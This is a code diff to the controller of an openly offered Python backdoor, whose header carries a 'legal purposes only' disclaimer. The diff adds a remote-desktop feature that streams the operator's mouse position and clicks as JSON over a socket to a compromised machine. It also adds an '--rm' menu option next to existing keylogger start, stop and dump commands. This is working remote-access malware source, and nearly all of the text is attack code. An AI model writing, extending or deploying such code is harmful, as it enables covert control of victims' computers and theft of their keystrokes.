@@ -8,7 +8,7 @@ License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import socket, os, time, threading, sys
+import socket, os, time, threading, sys, json
 from queue import Queue
 
 intThreads = 2
@@ -413,6 +413,41 @@ def send_command(command):
     objLogFile.close()
 
 
+def remote_desktop():
+    import win32gui, win32api
+    if sys.platform == "linux" or sys.platform == "linux2": return
+    conn.send(str.encode("rdesktop"))
+
+    def mouse_event_handler(state):
+        arrMousePos = win32gui.GetCursorPos()
+        intMouseClick = win32api.GetKeyState(0x01)  # Left button down = 0 or 1. Button up = -127 or -128
+
+        arrMouseState = arrMousePos, intMouseClick
+
+        if state == "False":  # if there is no previous state
+            return arrMouseState
+        elif arrMouseState != state:
+            return arrMouseState
+        else:
+            return None
+
+    try:
+        arrMouseState = mouse_event_handler("False")
+
+        while True:
+            time.sleep(0.01)
+
+            state = mouse_event_handler(arrMouseState)
+
+            if state is not None:  # if there is no change in the mouse
+                arrMouseState = state
+                jsonData = (json.dumps({"mouse_state": arrMouseState}))  # use json to send array by socket
+                conn.send(str.encode(jsonData))
+
+    except KeyboardInterrupt:
+        pass
+
+
 def show_help():
     print("--help")
     print("--m Send message")
@@ -483,6 +518,8 @@ def send_commands():
                 keylogger("stop")
             elif strChoice == "--k dump":
                 keylogger("dump")
+            elif strChoice == "--rm":
+                remote_desktop()
             else:
                 print("Invalid choice, please try again!")
 
